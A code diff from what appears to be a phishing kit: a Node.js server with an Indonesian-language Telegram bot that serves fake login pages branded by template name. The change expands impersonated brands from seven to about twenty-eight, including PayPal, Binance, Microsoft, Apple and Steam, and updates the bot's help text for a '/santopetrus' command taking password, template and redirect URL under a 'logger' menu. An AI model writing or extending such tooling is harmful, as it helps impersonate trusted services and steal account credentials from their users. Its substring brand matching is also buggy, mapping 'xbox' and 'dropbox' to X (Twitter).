@@ -529,14 +529,45 @@ async function startServer() {
       
       const payloadId = req.params.b64data;
       
-      let brandName = template || "Secure Authentication";
-      if(template.includes('fb') || template.toLowerCase().includes('facebook')) brandName = "Facebook";
-      if(template.includes('google')) brandName = "Google";
-      if(template.includes('ig') || template.toLowerCase().includes('instagram')) brandName = "Instagram";
-      if(template.includes('wa') || template.toLowerCase().includes('whatsapp')) brandName = "WhatsApp";
-      if(template.includes('tiktok')) brandName = "TikTok";
-      if(template.includes('x') || template.toLowerCase().includes('twitter')) brandName = "X (Twitter)";
-      if(template.includes('telegram')) brandName = "Telegram";
+      let brandName = "Secure Authentication";
+      const tmplLower = template ? template.toLowerCase() : "";
+      
+      const brandMap: Record<string, string> = {
+        'fb': 'Facebook', 'facebook': 'Facebook',
+        'google': 'Google', 'gmail': 'Google',
+        'ig': 'Instagram', 'instagram': 'Instagram',
+        'wa': 'WhatsApp', 'whatsapp': 'WhatsApp',
+        'tiktok': 'TikTok',
+        'x': 'X (Twitter)', 'twitter': 'X (Twitter)',
+        'telegram': 'Telegram', 'tg': 'Telegram',
+        'netflix': 'Netflix',
+        'spotify': 'Spotify',
+        'microsoft': 'Microsoft', 'outlook': 'Microsoft', 'hotmail': 'Microsoft',
+        'linkedin': 'LinkedIn',
+        'github': 'GitHub',
+        'paypal': 'PayPal',
+        'discord': 'Discord',
+        'steam': 'Steam',
+        'reddit': 'Reddit',
+        'binance': 'Binance',
+        'apple': 'Apple',
+        'amazon': 'Amazon',
+        'roblox': 'Roblox',
+        'playstation': 'PlayStation Network',
+        'xbox': 'Xbox Live',
+        'snapchat': 'Snapchat',
+        'pinterest': 'Pinterest',
+        'twitch': 'Twitch',
+        'canva': 'Canva',
+        'dropbox': 'Dropbox'
+      };
+
+      for (const [key, name] of Object.entries(brandMap)) {
+        if (tmplLower.includes(key)) {
+          brandName = name;
+          break;
+        }
+      }
       
       res.send(`
         <!DOCTYPE html>
@@ -1458,7 +1489,7 @@ async function startServer() {
                 `<code>/santopetrus [PASSWORD] [TEMPLATE] [REDIRECT_URL]</code>\n\n` +
                 `<b>Contoh Penggunaan:</b>\n` +
                 `<code>/santopetrus 19281933 facebook https://google.com</code>\n\n` +
-                `<i>Template yg tersedia: facebook, google, instagram, whatsapp, tiktok, twitter, telegram</i>`;
+                `<i>Template yg tersedia: facebook, google, instagram, whatsapp, tiktok, twitter, telegram, netflix, spotify, microsoft, linkedin, github, paypal, discord, steam, reddit, binance, apple, amazon, roblox, playstation, xbox, snapchat, pinterest, twitch, canva, dropbox dll.</i>`;
       const kb = Markup.inlineKeyboard([
         [Markup.button.callback('◀️ KEMBALI', 'menu_logger')]
       ]);
